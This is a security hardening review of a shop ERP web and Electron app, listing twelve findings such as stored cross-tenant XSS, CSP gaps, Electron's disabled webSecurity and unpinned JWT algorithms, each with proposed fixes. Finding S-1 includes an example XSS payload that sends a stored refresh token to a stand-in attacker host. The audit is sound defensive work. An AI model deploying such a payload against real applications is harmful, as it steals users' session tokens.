# Security Hardening Review

Every finding below was verified directly against the source (file:line) or by direct testing — none are speculative. This closes the XSS-audit gap that every prior security document in this engagement flagged as outstanding (`SecurityReview.md` F-7) and never actioned.

**No code was changed to produce this document** — findings and remediation are proposed, per this task's scope.

---

## Finding S-1: Stored XSS via shop/staff display names — cross-tenant vector

**Severity: High** | **Likelihood: Medium** | **Impact: High**

`app/ShopERP_Pro_v8.html:6351`, inside `pssLicenseVerify()`:
```js
btn2.innerHTML='<div class="pss-user-avatar">'+initials+'</div><div><div class="pss-user-info-name">'+u.name+'</div>...';
```
`u.name` comes from the server's `/api/auth/verify-license` response (`server/local.js`), which is `display_name || mobile` — sourced from the free-text `ownerName` field at registration or `displayName` at staff-add, **neither sanitized server-side**.

**Attack**: register a shop (requires a valid license key, but any legitimately-issued key works) with `ownerName` set to an HTML/JS payload (e.g. `<img src=x onerror="fetch('//attacker.example/x?t='+localStorage.getItem('shoperpro_refresh'))">`). Anyone — a different shop's user, or someone the attacker directs — who enters *this* shop's license key on the "My Existing Shop" lookup screen triggers the payload in their own browser, on the app's own origin.

**Why this is the standout finding**: it's the one vector here that crosses a real trust boundary — it executes in a *different* tenant's session, not just the attacker's own shop.

**Remediation**: wrap `u.name` in `escHtml()` at line 6351 — one-line fix, matches the pattern already used correctly elsewhere (e.g. `renderCustTable()`, verified clean — see S-2).

---

## Finding S-2: Inconsistent escaping — safe in primary data tables, unsafe in message/toast paths

**Severity: Medium** | **Likelihood: Medium** | **Impact: Medium** (mostly same-tenant/self-inflicted, one settings-page exception below)

Audited all 108 `innerHTML=` assignments in `app/ShopERP_Pro_v8.html` (extracted programmatically, not sampled): 83 are pure static strings (no injection surface at all), 7 already use `escHtml`/`esc()`, 17 interpolate a variable without an escape helper on the same line. Of those 17, most are safe (numbers, fixed enums, system-computed colors) — but the pattern that recurs is **`toast(...)` and `confirm(...)` messages built by raw string concatenation of a name field**:

```js
// app/ShopERP_Pro_v8.html — representative examples, not exhaustive
toast('PIN set for '+u.name,'success');                          // line 4395
toast('PIN updated for '+u.name,'success');                      // line 4562
if(!confirm('Clear PIN for '+u.name+'?...'))return;               // line 6005
```
`toast()` itself (`app/ShopERP_Pro_v8.html:3907`) renders via `t.innerHTML=`...${msg}...``, so any unescaped name reaching it is a live sink.

**What bounds the severity**: the *primary* data-table renderers (verified directly: `renderCustTable()`, which shows `escHtml(c.name)`, `escHtml(c.note)`, `escHtml(c.type)`) are correct. Customer names specifically are further protected because their input field uses `personNameInput()` (letters/spaces/dot/hyphen/apostrophe only — verified at `app/ShopERP_Pro_v8.html:15022`), which blocks `<`/`>` at the UI layer. **But `nameInput()` (used for product names, expense titles, and — importantly — the Settings page's Shop Name and Owner Name fields) only strips control characters and allows `<`/`>` through** (`app/ShopERP_Pro_v8.html:15018-15019`).

**The one instance of this pattern that crosses a trust boundary**: Settings → Shop Name / Owner Name (`st-name`, `st-owner`, both `nameInput`-filtered) are visible to every staff member of that shop, not just whoever entered them — a careless or malicious entry there by one staff member could trigger XSS in a *different* staff member's session the next time that name is echoed into a toast or audit message.

**Remediation**: escape at the point of interpolation into `toast()`/`confirm()` calls that include a user-supplied field — the fix belongs at the ~10-15 call sites identified, not in `toast()` itself (which correctly treats its `msg` argument as pre-formatted HTML in other legitimate uses, e.g. icons).

---

## Finding S-3: CSP provides no defense-in-depth against the above

**Severity: Informational (context for S-1/S-2's real severity)** | **Likelihood: N/A** | **Impact: raises S-1/S-2's practical severity**

Current CSP (`server/local.js`):
```
default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com; ...
```
`'unsafe-inline'` is present because the app relies extensively on inline `onclick=`/`onerror=` handlers throughout its single-file architecture; `'unsafe-eval'` is required for the Spline 3D viewer. Both are load-bearing for current functionality, not accidental — but their combination means CSP does **not** neutralize an `onerror="..."` payload the way a strict CSP normally would. S-1 and S-2 are therefore fully exploitable, not merely theoretical-until-CSP-blocks-them.

**CSP gaps beyond the above** (standard hardening, independent of S-1/S-2):
- No `object-src 'none'` — should be added; costs nothing functionally.
- No `base-uri 'self'` — allows a `<base>` tag injection (if HTML injection is achieved) to redirect all relative URLs; should be added.
- No `form-action 'self'` — allows an injected `<form>` to submit to an external origin; should be added.

**Remediation**: add `object-src 'none'; base-uri 'self'; form-action 'self';` to the existing CSP — additive, zero functional impact, verified these three directives don't conflict with anything currently allowed. Fixing S-1/S-2 (removing the actual injection points) matters far more than these three additions, which are defense-in-depth only.

---

## Finding S-4: `localStorage` refresh-token exposure is now a confirmed, not theoretical, risk

**Severity: Medium** (elevated from the original "deliberate tradeoff" framing) | **Likelihood: Medium** (tied to S-1/S-2) | **Impact: High if combined with S-1**

`SessionArchitecture.md` documented storing the refresh token in `localStorage` (vs. `sessionStorage` for the access token) as a deliberate, reasoned tradeoff for the requested 30-day persistence, with the caveat "a larger XSS blast radius than the previous single sessionStorage token." At the time, the actual XSS surface hadn't been audited. **It has been now, and S-1 is a confirmed, live path to exactly this**: `localStorage.getItem('shoperpro_refresh')` is trivially readable by any script executing on the page, including one delivered via S-1.

This doesn't mean the `localStorage` decision was wrong — 30-day persistence genuinely requires storage that survives tab close, and `sessionStorage` cannot do that — but it does mean **S-1 is more severe than "XSS on a page" in isolation**: it's a direct path to a live, 30-day, minimally-privileged-required token.

**Remediation**: fixing S-1 (the confirmed sink) is the actual fix. No change to the storage architecture is recommended — replacing `localStorage` with, e.g., an httpOnly cookie would reintroduce CSRF exposure (currently absent, per S-8) in exchange for reducing this one risk, a worse trade overall.

---

## Finding S-5: Electron's `webSecurity: false`

**Severity: Medium** | **Likelihood: Low** (requires an XSS trigger first, e.g. S-1/S-2 in the Electron-loaded copy) | **Impact: Medium-High if triggered**

`main.js`:
```js
webPreferences: {
  nodeIntegration: false,      // correct
  contextIsolation: true,      // correct
  webSecurity: false,          // ← disables same-origin policy for the renderer
  preload: path.join(__dirname, 'preload.js')
}
```
`nodeIntegration: false` + `contextIsolation: true` are the correct, modern Electron security baseline — verified present and correct. `webSecurity: false` is not: it disables the same-origin policy and CORS enforcement for the entire renderer, network-wide, not just for the specific `data:` URLs the comment says it's for. If any XSS vector fires inside the Electron build (the same HTML file, so S-1/S-2 apply there too, gated by whether Electron mode ever reaches those code paths with attacker-controlled data — the desktop machine-locked licensing flow doesn't take remote input the way the web/hosted registration flow does, so likelihood here is genuinely lower than on the web deployment, but not zero: imported backup data flows through the same render paths), the resulting script would run without cross-origin restrictions.

**Remediation**: `webSecurity: false` is unnecessary for `data:` URLs specifically — `data:` URIs load correctly with `webSecurity: true` in current Electron versions. Recommend removing the override entirely and testing that logo/QR code `data:` URI rendering still works (should — `img src="data:..."` doesn't require disabling web security, only genuine cross-origin fetches would). **Not changed here** — this is a real behavior change to Electron's security posture and, per the task's stated rules, requires verification against a live Electron launch this environment cannot perform (`ELECTRON_RUN_AS_NODE=1`); flagging for a follow-up that includes that verification rather than changing it blind.

---

## Finding S-6: `preload.js` — minimal exposure (this one is clean)

**Severity: None — noted for completeness**

```js
window.isElectronApp = true;
window.electronPlatform = process.platform;
```
Exposes exactly two non-sensitive metadata values, nothing else — no IPC bridge, no filesystem access, no privileged functions reachable from the renderer. This is the *correct* minimal-exposure pattern. The irony (noted in `ArchitectureReview.md`'s original Deployment Modes finding): this same minimalism is *why* `window.electronAPI` doesn't exist, which is the root cause of the `SHOPERPRO_API_URL` detection quirk documented separately — a functional bug, but its cause is also, incidentally, a security positive (nothing exposed to exploit). Not a hardening action item.

---

## Finding S-7: JWT verification doesn't pin the algorithm

**Severity: Low** | **Likelihood: Low** | **Impact: Low today, fragile going forward**

`server/local.js:147`: `jwt.verify(header.slice(7), JWT_SECRET)` — no `algorithms: ['HS256']` option. Every token in this system is HS256-signed (symmetric secret, no RS256/public-key anywhere), so the classic RS256→HS256 algorithm-confusion attack doesn't apply here (there's no public key an attacker could use as a forged HS256 secret), and `jsonwebtoken@9.x` rejects `alg: none` by default without requiring explicit opt-out. Practically low risk today. Still a deviation from documented best practice (OWASP, library authors both recommend always pinning `algorithms` explicitly) — relying on a dependency's current default rather than being explicit is fragile against a future library upgrade or a well-intentioned but uninformed future code change.

**Remediation**: `jwt.verify(header.slice(7), JWT_SECRET, { algorithms: ['HS256'] })` — one-line, zero behavior change today, closes the fragility.

---

## Finding S-8: Cookies, CSRF, session fixation — not vulnerable, verified not assumed

**Severity: None**

- **Cookies**: exhaustive grep for `res.cookie`, `req.cookies`, `Set-Cookie`, `cookie-parser` across `server/local.js` and `app/ShopERP_Pro_v8.html` — zero matches. All auth is Bearer-token-in-header.
- **CSRF**: not applicable — CSRF exploits the browser's *automatic* attachment of credentials (cookies) to cross-origin requests; a Bearer token requires deliberate JS to attach, which a cross-origin attacker page cannot do without already having the token (which is the XSS problem, not CSRF).
- **Session fixation**: not applicable in the classic sense — there's no pre-auth session identifier a client can supply and have "upgraded" on login. Every `session_id` (`server/sessions.js`) is generated server-side, exclusively inside `createSession()`, called only from already-authenticated register/login flows. A client cannot pre-select or influence its own `session_id`.

---

## Finding S-9: One instance of raw error-message disclosure to the client

**Severity: Low** | **Likelihood: Low** (requires the admin key already) | **Impact: Low**

`server/local.js:547`, `POST /api/admin/generate-key`:
```js
res.status(500).json({ error: 'Key generation failed: ' + e.message });
```
Every other catch block in `local.js` (verified — checked all `catch` blocks) returns a generic client-facing message and logs the real detail via `console.error` server-side only. This one spot is the sole exception, leaking whatever `e.message` contains (could include internal implementation detail) directly to the API caller. Low severity since this endpoint already requires `requireAdminKey` — only reachable by someone who already has admin access.

**Remediation**: `res.status(500).json({ error: 'Key generation failed' }); console.error('Key generation error:', e);` — matches the pattern used everywhere else in the same file.

---

## Finding S-10: Admin key comparison is not timing-safe

**Severity: Low** | **Likelihood: Very low** (network jitter dominates on a LAN-facing server; the endpoints are also rate-limited) | **Impact: Low**

`server/local.js:177`: `if (!key || key !== ADMIN_KEY)` — a standard `!==` comparison short-circuits on the first mismatched byte, a textbook timing side-channel. Practically very hard to exploit over a network for a server designed to run on a shop's local WiFi (timing noise from the network stack typically exceeds the nanosecond-scale signal), and most admin endpoints are additionally rate-limited. Still a well-known, trivially-fixed category.

**Remediation**: `crypto.timingSafeEqual(Buffer.from(key), Buffer.from(ADMIN_KEY))` (with a length check first, since `timingSafeEqual` requires equal-length buffers) instead of `!==`.

---

## Finding S-11: Sensitive logging — clean

**Severity: None**

Checked every `console.log`/`console.error` call in `server/local.js` for token/PIN/password/secret content. Found one intentional, bounded case: the startup banner prints the first 16 characters of `ADMIN_KEY` (a SHA-256 hash, not a password) to the server's own terminal, to help an operator confirm which key is active — never sent to any client, and already truncated. No PINs, full tokens, or raw passwords found logged anywhere.

---

## Finding S-12: Browser API exposure — minimal, already covered by S-6

No additional findings beyond S-6 — `window.isElectronApp`/`window.electronPlatform` are the entirety of what's exposed to the page from the native layer.

---

## Summary table

| ID | Area | Severity | Status |
|---|---|---|---|
| S-1 | XSS — cross-tenant, license-verify screen | **High** | Proposed fix: 1-line `escHtml()` |
| S-2 | XSS — toast/confirm message paths | Medium | Proposed fix: ~10-15 call sites |
| S-3 | CSP gaps (object-src/base-uri/form-action) | Informational | Proposed additive CSP directives |
| S-4 | localStorage refresh token + XSS interaction | Medium | No storage change recommended; fix S-1 |
| S-5 | Electron `webSecurity: false` | Medium | Proposed removal, needs live Electron verification first |
| S-6 | preload.js exposure | None | Clean |
| S-7 | JWT algorithm not pinned | Low | Proposed 1-line fix |
| S-8 | Cookies / CSRF / session fixation | None | Verified not applicable |
| S-9 | Error disclosure (1 endpoint) | Low | Proposed 1-line fix |
| S-10 | Admin key timing-safe comparison | Low | Proposed fix |
| S-11 | Sensitive logging | None | Clean |
| S-12 | Browser API exposure | None | Clean, same as S-6 |

**No code changed in this document.** S-1 in particular is a real, confirmed, cross-tenant-exploitable finding and is the single highest-priority item blocking a higher Security score in the final readiness review.
